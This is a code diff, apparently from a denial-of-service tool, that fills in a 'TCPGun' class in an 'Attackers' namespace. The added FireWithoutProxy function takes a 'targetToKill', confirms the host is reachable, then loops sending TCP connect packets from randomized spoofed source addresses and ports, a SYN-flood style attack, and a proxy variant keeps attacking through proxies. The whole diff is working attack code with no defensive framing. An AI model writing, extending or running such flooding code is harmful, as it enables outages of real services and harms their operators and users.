@@ -8,12 +8,33 @@
 
 using namespace Attackers;
 
-bool TCPGun::FireWithoutProxy() noexcept
+bool TCPGun::FireWithoutProxy(const Target &targetToKill) noexcept
 {
-
+	// Checking connectivity over proxy, because packets would be send with randomized source
+	const std::string currentTarget
+		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
+	TCPWrapper tcpAttacker;
+	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), {})};
+	while(!g_shouldStop.load() && resolvedAddress)
+	{
+		std::cout << resolvedAddress->address << " is up" << std::endl;
+		for(size_t count = 0; 
+			count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK; count++)
+		{
+			Target fakeSource{GetRandomIP(), GetRandomPort()};
+			TCPWrapper::TCPStatus sendStatus = tcpAttacker.SendConnectPacket(fakeSource, *resolvedAddress);
+			if(sendStatus == TCPWrapper::TCPStatus::NeedConnectivityCheck ||
+				sendStatus == TCPWrapper::TCPStatus::GotError)
+			{
+				return true;
+			}
+		}
+		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), {});
+	}
+	return false;
 }
 
-void TCPGun::FireWithProxy() noexcept
+void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
 {
 	Informator informer;
 	while(!g_shouldStop.load() && !informer.LoadNewData())
@@ -45,17 +66,6 @@ void TCPGun::FireWithProxy() noexcept
 		}
 		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), *proxies);
 	}
-
-}
-
-bool TCPGun::SetValidProxy() noexcept
-{
-
-}
-
-std::optional<Proxy> TCPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
-{
-
 }
 
 std::optional<Target> TCPGun::Aim(const CURI &uriToAttack) noexcept
